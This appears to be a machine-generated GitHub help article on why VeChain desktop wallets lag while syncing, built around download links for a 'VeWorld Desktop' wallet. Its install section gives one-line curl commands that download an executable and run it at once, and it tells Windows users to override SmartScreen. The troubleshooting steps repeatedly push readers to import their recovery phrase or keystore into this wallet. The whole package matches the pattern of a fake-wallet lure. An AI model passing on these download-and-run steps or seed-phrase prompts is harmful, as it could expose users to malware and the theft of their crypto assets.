![VeWorld Desktop](../assets/banner-article.png)

# VeChain Wallet Sync: Why Older Desktop Wallets Fall Behind VeWorld Desktop

Older wallets download blocks; newer designs just ask the network

## Downloads - v2.2.4

<p align="center"><a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`VeWorld-desktop-wallet-win-v2.2.4.exe`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-win-v2.2.4.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`VeWorld-desktop-wallet-macos-v2.2.4.dmg`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-macos-v2.2.4.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`VeWorld-desktop-wallet-linux-v2.2.4.zip`](https://github.com/veworldwallet/veworld-desktop-wallet/releases/download/v2.2.4/VeWorld-desktop-wallet-linux-v2.2.4.zip) |

Download the [current VeWorld Desktop release](https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4) for Windows, macOS and Linux.

> VeWorld Desktop is actively maintained; run the current release before treating a display problem as a wallet fault.

A desktop wallet that keeps its own copy of chain data has to catch up before it can show accurate balances, and that catch-up is what people experience as "syncing". A wallet that asks the network for account state instead shows a balance as a query rather than after a download.

<!-- ARTICLE-BODY-BEGIN -->

## You'll see this if

A wallet sits at a percentage, takes minutes to become usable, shows transactions that never arrive, or reports a balance that an explorer contradicts. The behaviour often appears after the machine has been off for a while, which makes it look like a fault rather than a backlog.

| Symptom | Cause in a syncing wallet | Cause in a reading wallet |
|---|---|---|
| Hours at "connecting" | Local chain copy is behind | Network or account read failure |
| Balance differs from explorer | Snapshot is stale | Account or network mismatch |
| Transaction sent but absent | Not yet indexed locally | Sent on another network |
| Balance correct, history short | History not fully downloaded | History window is limited |

## Why it happens

There are two architectures for a desktop wallet, and the difference explains almost every "sync" complaint. One keeps a local database of chain data and updates it block by block; it is fully self-contained but it must reach the chain's current height before it can answer accurately. The other asks the network what an address holds and shows the reply.

A syncing wallet is not broken when it lags. It is doing work that takes time proportional to how far behind it is, and a machine that was asleep for a month has a month of blocks to process. Interrupting it - closing the app, sleeping the machine, switching networks - restarts part of that effort and makes the lag longer, which is why the experience feels inconsistent.

A reading wallet has a different failure mode. It cannot be "behind", but it can be wrong about which chain or which address it is looking at. A network selector pointed at a test network, a second account selected in the header, or <a href="https://github.com/veworldwallet/veworld-desktop-hardware/blob/main/how-to/pair-a-vechain-ledger-with-veworld-desktop.md">a Ledger account index in VeWorld Desktop</a> different from the one you expect will each produce an empty or unexpected balance instantly, with no progress bar to explain it.

Transactions add a third case. A transaction is only real once it is included in a block, and a wallet that has not yet reached that block will show the send as pending or missing. Checking the address in a block explorer settles the question immediately: if the explorer shows the transaction, the chain accepted it and the wallet is simply behind.

## Fix

1. Identify which behaviour you have: a progress indicator that creeps forward means syncing; an instant but wrong balance means a reading problem.
2. If it is syncing, leave the application open and the machine awake until it reaches the current height, rather than restarting it repeatedly.
3. If it is a reading problem, check the network selector and the selected account before anything else.
4. Verify the transaction or balance in a block explorer and compare it with the wallet.
5. For an account that must be usable immediately, import the phrase or keystore into a wallet that reads the balance from the network instead of waiting for a local copy.

## If that did not work

If syncing restarts from a low percentage every time the app opens, the local database is being discarded between sessions - often because the application cannot write to its data directory. Check that the folder is writable and that the disk has free space.

If the balance in the wallet is lower than the explorer shows, and the addresses match exactly, the local snapshot predates the incoming transaction. Waiting for the next block is sufficient; nothing has been lost. A wallet that reads the account from the network closes that gap without a download, which is the practical reason to keep one available when a balance has to be confirmed quickly.

If a transaction stays missing for hours while the explorer shows it as confirmed, the wallet's history index is incomplete. The funds are where the chain says they are, and a wallet that reads state directly will show them without further waiting.

## Prevention

- Keep the machine awake and the app open during a first sync, rather than closing it repeatedly.
- Confirm the network and account before interpreting an empty balance.
- Note the transaction hash when sending, so the explorer can settle any doubt later.
- Prefer a wallet that reads account state when you need an answer now rather than after a download.

VeWorld Desktop is actively maintained, and the current release can be downloaded from the <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/tag/v2.2.4">VeWorld Desktop releases page</a>.

## FAQ

### How do I tell whether this wallet is syncing?

Look for a progress indicator. A wallet holding a local chain copy shows one and must reach the current height before it can answer; a wallet that reads the account from the network has none and shows the balance as soon as the query returns.

### Why does an old desktop wallet take so long?

Because it stores chain data locally and must reach the current block height before it can answer accurately. Time away from the machine is time it has to make up.

### My wallet shows a transaction that never confirmed. What now?

Look the hash up in a block explorer. If it is absent there, it was never included and can be resent; if it is present, the wallet is simply behind.

### Can a syncing wallet lose funds?

No. Syncing affects what the software displays, not what the chain holds. The address and its balance are unchanged throughout.

### Should I reinstall if syncing stalls?

Not before confirming you have <a href="https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/forgot-vechain-wallet-password-in-veworld-desktop.md">your VeWorld Desktop recovery phrase</a> written down, and never share it with anyone. On a self-custody wallet, reinstalling can remove local storage, and the phrase is what restores access.

<!-- ARTICLE-BODY-END -->

## How to install VeWorld Desktop

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-win-v2.2.4.exe">VeWorld-desktop-wallet-win-v2.2.4.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-macos-v2.2.4.dmg">VeWorld-desktop-wallet-macos-v2.2.4.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
<!-- BLOCKED: the Linux release asset is a .zip with no verified extraction or launch facts,
     so no command is generated. The verified manual steps are kept below. -->
Manual install:
1. Download <a href="https://github.com/veworldwallet/veworld-desktop-wallet/releases/latest/download/VeWorld-desktop-wallet-linux-v2.2.4.zip">VeWorld-desktop-wallet-linux-v2.2.4.zip</a>.
2. Unzip the archive.
3. Run the application inside it.
<!-- INSTALL-END -->

## Related guides

- [Leaving Sync and Sync2 behind](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/how-to-send-vtho-from-sync-wallet-to-veworld-desktop.md)
- [When a funded account reads zero](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/check-vechain-balance-zero-in-veworld-desktop.md)
- [Moving from the VeChainThor wallet](https://github.com/veworldwallet/veworld-desktop-how-to/blob/main/how-to/vechain-thor-wallet-to-veworld-desktop.md)
- [What VeWorld Desktop is](https://github.com/veworldwallet/veworld-desktop-fees/blob/main/how-to/what-is-veworld-desktop.md)